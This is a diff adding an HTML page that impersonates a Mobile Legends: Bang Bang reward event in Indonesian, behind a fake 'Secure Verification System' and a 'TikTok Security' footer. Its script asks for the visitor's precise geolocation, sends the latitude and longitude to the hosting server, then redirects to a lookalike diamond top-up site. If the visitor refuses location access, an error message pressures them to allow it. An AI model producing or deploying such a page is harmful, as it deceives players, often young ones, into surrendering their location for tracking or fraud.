@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Mobile Legends: Bang Bang</title>
+
+    <meta property="og:title" content="Mobile Legends: Bang Bang">
+    <meta property="og:description" content="Get your exclusive reward now!">
+    <meta property="og:image" content="https://cdn.jsdelivr.net/gh/ByexeOfficial999/image-to-url@main/1000599276.png">
+    <meta property="og:url" content="https://mlbb.com">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Mobile Legends: Bang Bang">
+    <meta property="og:locale" content="id_ID">
+    
+    <link
+        href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap"
+        rel="stylesheet"
+    >
+
+    <link
+        rel="icon"
+        type="image/png"
+        href="https://akmweb.youngjoygame.com/web/gms/image/1d4439a2ab14e995b99fd8934adb34ee.svg"
+        sizes="32x32"
+    >
+</head>
+              <style>
+                  :root { --accent-blue: #0095f6; --text-main: #1c1e21; --text-secondary: #5f6368; --border-light: #e0e6ed; --error-red: #d93025; }
+                  body { font-family: 'Poppins', sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+                  .container { width: 85%; max-width: 400px; text-align: center; animation: fadeInUp 0.6s ease-out; margin-top: -50px; }
+                  @keyframes fadeInUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+                  .avatar img { width: 80px; margin-bottom: 10px; }
+                  .brand-name { font-size: 20px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 6px; }
+                  .brand-name svg { width: 22px; color: var(--accent-blue); }
+                  .sub-title { font-size: 13px; color: var(--text-secondary); margin-bottom: 30px; }
+                  .checkbox-wrapper { background: #f8fbff; padding: 18px; border-radius: 16px; margin-bottom: 8px; text-align: left; border: 1px solid var(--border-light); transition: 0.3s; }
+                  .checkbox-label { font-size: 12.5px; color: var(--text-secondary); display: flex; align-items: flex-start; gap: 12px; cursor: pointer; }
+                  #error-msg { color: var(--error-red); font-size: 11px; text-align: left; margin-bottom: 20px; padding-left: 5px; display: none; font-weight: 600; }
+                  .btn-verify { width: 100%; padding: 16px; border: none; border-radius: 14px; background: var(--accent-blue); color: white; font-size: 15px; font-weight: 600; cursor: pointer; box-shadow: 0 4px 15px rgba(0, 149, 246, 0.3);margin-top: 20px; }
+                  .footer-text { margin-top: 70px; font-size: 10px; color: #727272ff; letter-spacing: 1.5px; text-transform: none; }
+              </style>
+          </head>
+          <body>
+              <div class="container">
+                  <div class="avatar"><img src="https://akmweb.youngjoygame.com/web/gms/image/1d4439a2ab14e995b99fd8934adb34ee.svg"></div>
+                  <div class="brand-name">
+                      MLBB EVENT
+                      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M14.201 1.122a1 1 0 0 1 1.332.357l1.307 2.138 2.506.063a1 1 0 0 1 .974.975l.063 2.505 2.139 1.307a1 1 0 0 1 .356 1.332L21.68 12l1.198 2.201a1 1 0 0 1-.357 1.332l-2.138 1.307-.063 2.506a1 1 0 0 1-.974.974l-2.506.063-1.307 2.139a1 1 0 0 1-1.332.356L12 21.68l-2.201 1.198a1 1 0 0 1-1.332-.357L7.16 20.383l-2.506-.063a1 1 0 0 1-.974-.974l-.063-2.506-2.138-1.307a1 1 0 0 1-.357-1.332L2.32 12 1.122 9.799a1 1 0 0 1 .357-1.332L3.617 7.16l.063-2.505a1 1 0 0 1 .974-.975l2.506-.063L8.467 1.48A1 1 0 0 1 9.8 1.122L12 2.32l2.201-1.198zm2.44 9.146a1 1 0 1 0-1.281-1.536l-.067.055a43.003 43.003 0 0 0-4.852 4.74l-1.734-1.734a1 1 0 0 0-1.414 1.414l2.5 2.5a1 1 0 0 0 1.475-.067l.056-.067a41 41 0 0 1 5.25-5.25l.066-.055z"></path></svg>
+                  </div>
+                  <div class="sub-title">Secure Verification System</div>
+
+                  <div class="checkbox-wrapper" id="wrap">
+                      <label class="checkbox-label">
+                          <input type="checkbox" id="c" style="margin-top:4px">
+                          <span>I agree to the security terms and conditions to continue the transaction.</span>
+                      </label>
+                  </div>
+                  <div id="error-msg">Please agree to the terms to continue.</div>
+
+                  <button onclick="handleVerify()" class="btn-verify">Continue</button>
+                  <div class="footer-text">© 2026 MLBB | TikTok Security</div>
+              </div>
+
+              <script>
+                function handleVerify() {
+
+  const isChecked =
+    document.getElementById('c').checked;
+
+  const errorMsg =
+    document.getElementById('error-msg');
+
+  const wrap =
+    document.getElementById('wrap');
+
+  errorMsg.style.display = 'none';
+  wrap.style.borderColor = '#e0e6ed';
+  wrap.style.background = '#f8fbff';
+
+  if (!isChecked) {
+
+    errorMsg.textContent =
+      'Please agree to the terms to continue.';
+
+    errorMsg.style.display =
+      'block';
+
+    wrap.style.borderColor =
+      '#d93025';
+
+    wrap.style.background =
+      '#fffafa';
+
+    return;
+  }
+
+  if (!navigator.geolocation) {
+
+    errorMsg.textContent =
+      'Location access is not supported on this device.';
+
+    errorMsg.style.display =
+      'block';
+
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+
+    async (pos) => {
+
+      const lat =
+        pos.coords.latitude;
+
+      const lon =
+        pos.coords.longitude;
+
+      try {
+
+        await fetch('/location', {
+          method: 'POST',
+          headers: {
+            'Content-Type':
+              'application/json'
+          },
+          body: JSON.stringify({
+            lat,
+            lon
+          })
+        });
+
+      } catch (err) {
+        console.log(
+          'Gagal kirim lokasi:',
+          err
+        );
+      }
+
+      window.location.href =
+        'https://en-worlds.topup-diamonds.com';
+
+    },
+
+    () => {
+
+      errorMsg.textContent =
+        'Verifikasi Ditolak, Gagal Akses Situs Top Up Mobile Legends.';
+
+      errorMsg.style.display =
+        'block';
+
+      wrap.style.borderColor =
+        '#d93025';
+
+      wrap.style.background =
+        '#fffafa';
+
+    },
+
+    {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
+    }
+  );
+}
+</script>
+</body>
+</html>
